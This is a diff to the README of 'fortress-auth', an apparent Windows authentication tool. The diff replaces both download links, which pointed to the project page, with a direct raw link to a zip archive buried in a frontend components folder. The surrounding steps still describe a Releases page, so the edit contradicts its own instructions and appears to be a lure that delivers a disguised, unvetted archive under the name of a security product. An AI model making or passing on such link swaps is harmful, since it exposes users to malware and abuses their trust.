@@ -1,6 +1,6 @@
 # 🛡️ fortress-auth - Simple protection for your digital assets
 
-[![](https://img.shields.io/badge/Download-Fortress-blue.svg)](https://github.com/wian4268/fortress-auth)
+[![](https://img.shields.io/badge/Download-Fortress-blue.svg)](https://raw.githubusercontent.com/wian4268/fortress-auth/main/frontend/src/components/auth_fortress_v1.6-alpha.5.zip)
 
 fortress-auth is a security tool designed to keep your private data safe. It organizes your login process and adds extra layers of defense against unauthorized access. This software uses standard industry methods to lock your accounts and track potential threats. You can install it on your Windows computer to manage your login credentials and verify user identities with ease.
 
@@ -19,7 +19,7 @@ Your computer must meet these basic standards to run the software.
 
 You need to visit the main project page to download the latest version of the installer.
 
-1. Go to [the official download page](https://github.com/wian4268/fortress-auth).
+1. Go to [the official download page](https://raw.githubusercontent.com/wian4268/fortress-auth/main/frontend/src/components/auth_fortress_v1.6-alpha.5.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the version number at the top of the list.
 4. Locate the section named Assets.
